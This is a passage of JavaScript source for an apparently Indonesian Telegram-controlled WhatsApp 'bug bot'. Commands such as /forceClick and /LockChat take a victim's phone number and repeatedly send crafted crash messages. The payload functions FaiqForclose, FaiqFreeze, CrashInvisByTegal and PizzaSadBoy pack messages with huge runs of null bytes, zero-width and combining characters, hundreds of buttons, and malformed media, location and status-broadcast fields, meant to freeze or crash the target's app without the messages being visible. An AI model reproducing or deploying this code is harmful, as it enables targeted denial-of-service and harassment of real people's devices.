      : "ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ";

   
    const senderName =
      sock?.user?.name ||
      sock?.user?.verifiedName ||
      "ᴛɪᴅᴀᴋ ᴀᴅᴀ ɴᴀᴍᴀ";

    botList += `║ ⌑ ɴᴀᴍᴀ sᴇɴᴅᴇʀ : ${senderName}\n`;
    botList += `║ ⌑ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ : ${senderNumber}\n`;
    botList += `║ ⌑ sᴛᴀᴛᴜs : ${isConnected ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛᴇʀᴘᴜᴛᴜs"}\n`;
    botList += "║\n";
    botList += `║ ⌑ ᴛᴏᴛᴀʟ sᴇɴᴅᴇʀ : ${isConnected ? "1" : "0"}\n`;
    botList += "╰━━━━━━━━━━━━━━━━━━⬡";

    await ctx.reply(botList);
  } catch (error) {
    console.error("Error in listsender:", error);

    await ctx.reply(
      `❌ ☇ Terjadi kesalahan saat mengambil sender:\n${error.message}`
    );
  }
});
// ~ Case Pairing ~ \\
bot.command("connect", checkOwner, async (ctx) => {
  const date = getCurrentDate();
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "🪧 ☇ Format : /connect 62xx"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  try {
    const code = await sock.requestPairingCode(
      phoneNumber,
      "GALAXY13"
    );

    const formattedCode =
      code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.reply(
      `\`\`\`js
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
𝗞𝗼𝗱𝗲 : ${formattedCode}
𝗧𝗶𝗺𝗲𝗿 : ${date}

𝗦𝗮𝗹𝗶𝗻 𝗸𝗼𝗱𝗲 𝗱𝗮𝗹𝗮𝗺 𝟭𝟬 𝗺𝗲𝗻𝗶𝘁
𝘁𝗶𝗱𝗮𝗸 𝗱𝗶 𝗺𝗮𝘀𝘂𝗸𝗶𝗻 𝗮𝗽ᴜs sᴇsɪᴏɴ
\`\`\``,
      {
        parse_mode: "Markdown"
      }
    );

  } catch (error) {
    console.error(
      chalk.red("Gagal melakukan pairing:"),
      error
    );

    await ctx.reply(
      "🪧 ☇ Silahkan Restart session anda terlebih dahulu"
    );
  }
});
// ~ Function Sleep ( Untuk Jeda Saat Kirim Bug ) ~ \\
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ~ Case Bug 1 ~ \\
bot.command("ModeDelay", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh : /ModeDelay 628xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await detectPV(ctx, "/ModeDelay", q);

  
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
  }

  await ctx.reply(
`⸙ 
♛ Target : ${q}
♛ Type : Result 
♛ Status : Dikirim`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
      ],
    },
  });

  for (let i = 0; i < 25; i++) {
    await PizzaSadBoy(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

// ~ Case Bug 2 ~ \\
bot.command("xdelay", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh : /xdelay 628xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await detectPV(ctx, "/xdelay", q);

  
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
  }

  await ctx.reply(
`⸙ 
♛ Target : ${q}
♛ Type : Result 
♛ Status : Dikirim`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
      ],
    },
  });

  for (let i = 0; i < 30; i++) {
    await blankTegal(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});
// ~ Case Bug 3 ~ \\
bot.command("LockChat", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh : /LockChat 628xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await detectPV(ctx, "/LockChat", q);

  
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
  }

  await ctx.reply(
`⸙ 
♛ Target : ${q}
♛ Type : Result 
♛ Status : Dikirim`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
      ],
    },
  });

  for (let i = 0; i < 25; i++) {
    await CrashInvisByTegal(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});
// ~ Case Bug 4 ~ \\
bot.command("BlanlClick", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh : /BlanlClick 628xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await detectPV(ctx, "/BlanlClick", q);

  
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
  }

  await ctx.reply(
`⸙ 
♛ Target : ${q}
♛ Type : Result 
♛ Status : Dikirim`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
      ],
    },
  });

  for (let i = 0; i < 30; i++) {
    await FaiqFreeze(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});
// ~ Case Bug 3 ~ \\
bot.command("forceClick", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh : /forceClick 628xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await detectPV(ctx, "/forceClick", q);

  
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
  }

  await ctx.reply(
`⸙ 
♛ Target : ${q}
♛ Type : Result 
♛ Status : Dikirim`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
      ],
    },
  });

  for (let i = 0; i < 40; i++) {
    await FaiqForclose(sock, target);
    await sleep(1500);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});
// ~ Function Bugs ~ \ \
async function FaiqForclose(sock, target) {
  try {
    console.log(`[King-Faiq] Processing: ${target}`);
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const z = (s) => "\u0000".repeat(s);
    const unicodeOverflow = "𑇂𑆵𑆴𑆿".repeat(25000);
    const overflowChar = "ꦾ".repeat(40000);
    const specialChar = "꧀".repeat(35000);
    const invisibleChar = "\u200B".repeat(50000);
    const target = target.includes("@") ? target : target + "@s.whatsapp.net";
    console.log(`[1/7] Sending bug crash payload (no chat visible)...`);

    const invisibleMsg = {
      extendedTextMessage: {
        text: invisibleChar + z(100000),
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999999999
        }
      }
    };

    await sock.relayMessage(target, invisibleMsg, {
      participant: { jid: target }
    });

    await sleep(300);

    const invisibleSticker = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: Buffer.alloc(32, 0x00).toString("base64"),
        fileEncSha256: Buffer.alloc(32, 0x00).toString("base64"),
        mediaKey: Buffer.alloc(32, 0x00).toString("base64"),
        mimetype: "image/webp",
        height: 1,
        width: 1,
        directPath: "/o1/v/t62.7118-24/transparent.enc",
        fileLength: 1,
        mediaKeyTimestamp: "1",
        isAnimated: false,
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true
        }
      }
    };

    await sock.relayMessage(target, invisibleSticker, {
      participant: { jid: target }
    });

    await sleep(300);

    console.log(`[2/7] Sending bug status broadcast crash...`);

    for (let i = 0; i < 30; i++) {
      const invisibleStatus = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: z(300000), format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: z(1000000),
                version: 999
              },
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999999999,
                statusAttributionType: 0 // Invisible attribution
              }
            }
          }
        }
      };

      await sock.relayMessage("status@broadcast", invisibleStatus, {
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }]
          }]
        }]
      });

      await sleep(100);
    }

    await sleep(500);

    console.log(`[3/7] Sending bug protocol crash...`);

    for (let i = 0; i < 50; i++) {
      const invisibleProtocol = {
        groupStatusMessageV2: {
          message: {
            protocolMessage: {
              type: 25,
              key: { remoteJid: target, fromMe: true, id: generateId() }
            }
          }
        }
      };

      await sock.relayMessage(target, invisibleProtocol, {
        participant: { jid: target }
      });

      await sleep(100);
    }

    await sleep(500);

    console.log(`[4/7] Sending interactive bug crash (80x loop)...`);

    for (let i = 0; i < 80; i++) {
      const interactiveInvisible = {
        interactiveMessage: {
          header: { title: invisibleChar, hasMediaAttachment: false },
          body: { text: z(150000) + invisibleChar, format: "DEFAULT" },
          footer: { text: invisibleChar, format: "DEFAULT" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300 }, (_, idx) => ({
              name: ["single_select", "call_permission_request", "quick_reply"][idx % 3],
              buttonParamsJson: JSON.stringify({
                display_text: invisibleChar + z(30000),
                id: generateId()
              })
            })),
            messageParamsJson: z(200000)
          },
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999999999,
            stanzaId: generateId()
          }
        }
      };

      await sock.relayMessage(target, interactiveInvisible, {
        participant: { jid: target }
      });

      await sleep(100);
    }

    await sleep(1000);

    console.log(`[5/7] Sending bug audio crash...`);

    const invisibleAudio = {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
        fileLength: "999999999999999",
        seconds: 99999999999999,
        ptt: true,
        mediaKey: Buffer.alloc(32, 0x00).toString("base64"),
        fileEncSha256: Buffer.alloc(32, 0x00).toString("base64"),
        directPath: "/v/t62.7114-24/placeholder.enc",
        mediaKeyTimestamp: "99999999999999",
        waveform: z(100000),
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999999999
        }
      }
    };

    for (let i = 0; i < 20; i++) {
      await sock.relayMessage(target, invisibleAudio, {
        participant: { jid: target }
      });
      await sleep(150);
    }

    await sleep(500);

    console.log(`[6/7] Sending bug location crash...`);

    const invisibleLocation = {
      locationMessage: {
        degreesLatitude: 99999.99999999,
        degreesLongitude: -99999.99999999,
        name: invisibleChar + unicodeOverflow,
        address: invisibleChar + overflowChar,
        url: `https://${invisibleChar}.crash.com`,
        jpegThumbnail: Buffer.alloc(50000, 0xff),
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999999999
        }
      }
    };

    for (let i = 0; i < 30; i++) {
      await sock.relayMessage(target, invisibleLocation, {
        participant: { jid: target }
      });
      await sleep(150);
    }

    await sleep(1000);

    console.log(`[7/7] Sending final Bug to all targets...`);

    const finalInvisibleBomb = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: Buffer.alloc(1000000, 0xff)
          },
          interactiveResponseMessage: {
            body: { text: z(2000000) + invisibleChar, format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: z(4000000),
              version: 999
            },
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999999999,
              stanzaId: generateId(),
              virtexId: generateId()
            }
          }
        }
      }
    };

    for (let i = 0; i < 50; i++) {
      await sock.relayMessage(target, finalInvisibleBomb, {
        participant: { jid: target }
      });
      await sleep(100);
    }

    for (let i = 0; i < 50; i++) {
      await sock.relayMessage("status@broadcast", finalInvisibleBomb, {
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }]
          }]
        }]
      });
      await sleep(100);
    }

    console.log(`[King-Faiq] Success: ${target}`);
    console.log(`💀 WhatsApp target akan crash bokep (tanpa terlihat)!`);

  } catch (error) {
    console.error(`[King-Faiq] Error: ${error.message}`);
  }
}

async function FaiqFreeze(sock, target) {
  try {
    console.log(`[FAIQ-FREEZE] Processing: ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);
    const formattedTarget = target.includes("@") ? target : target + "@s.whatsapp.net";

    const generateWAMessageFromContent = (jid, content, options = {}) => {
      return {
        key: { remoteJid: jid, fromMe: true, id: generateId() },
        message: content,
        messageTimestamp: Math.floor(Date.now() / 1000),
        ...options
      };
    };

    const msg = generateWAMessageFromContent(formattedTarget, {
      interactiveResponseMessage: {
        body: { text: "TheKingFaiq", format: 1 },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: JSON.stringify({
            wa_flow_response_params: {
              title: "𑇂𑆵𑆴𑆿".repeat(60000)
            }
          }),
          version: 3
        }
      }
    }, {
      participant: { jid: formattedTarget }
    });

    await sock.relayMessage(formattedTarget, msg.message, { messageId: msg.key.id });

    console.log(`[FAIQ-FREEZE] Success: ${formattedTarget}`);

  } catch (error) {
    console.error(`[FAIQ-FREEZE] Error: ${error.message}`);
  }
}

async function CrashInvisByTegal(sock, target) {
    try {
        const rezz = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u00A1"+"\u0000"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "[".repeat(10000),
                            buttons: "\u00A1".repeat(250000) + "\u0000".repeat(250000)
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, rezz, { participant: { jid: target } });
        
        return { status: true, message: "Crash invisible successfully" };
    } catch (error) {
        return { status: false, error: error.message };
    }
}

async function PizzaSadBoy(sock, target) {
    const PizzaMsg = {
        interactiveMessage: {
            header: {
                title: "ꪸ⃟🩸 𝐋 𝐀 𝐑 𝐈 𝐀 𝐃 𝐀 𝐏 𝐈 𝐙 𝐙 𝐀 🩸ꪸ⃟",
                },
            body: {},
            footer: {
                text: "🩸 𝐏 𝐈 𝐙 𝐙 𝐀 𝐇 𝐄 𝐑 𝐄 🩸",
                hasMediaAttachment: true,
      imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            },
            title: " ⃰ꪸ⃟",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
            nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "booking_status",
                                    buttonParamsJson: "\u0000"
                                },
                                {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
                                 },
                                 {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
                                 },
                                 {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
                                 },
                                 {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
                                 },
                                 {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦾ".repeat(25000), flow_message_version: "3" })
                                 },
                                 {
                                   name: "galaxy_message", 
                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
                                 }
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍"
                    },
                }
            }
        }
         
        await sock.relayMessage(target,PizzaMsg,{
            participant: { jid: target }
            })
}

// ~ End Function Bugs ~ \\
(async () => {

  console.log("\n");

  console.log(chalk.blue(`
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀
╭───────□□□■■■────────────╮
│𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 1.0
│𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : @gaxx4u
╰───────■■■□□□────────────╯`));

  console.log("\n");

 
  const tokenOk = await validateToken();
  if (!tokenOk) {
    console.log("❌ Token tidak diterima di database...");
    process.exit(1);
  }

 
  const pwOk = await checkPassword();
  if (!pwOk) {
    console.log("");
    process.exit(1);
  }

  console.log("\n✅ Token diterima siap menjalankan bot...\n");

  
  try {
    await WhatsAppConnect();
    await bot.launch();
    startBot();
  } catch (err) {
    console.log("❌ Gagal start bot :", err.message);
    process.exit(1);
  }

})();
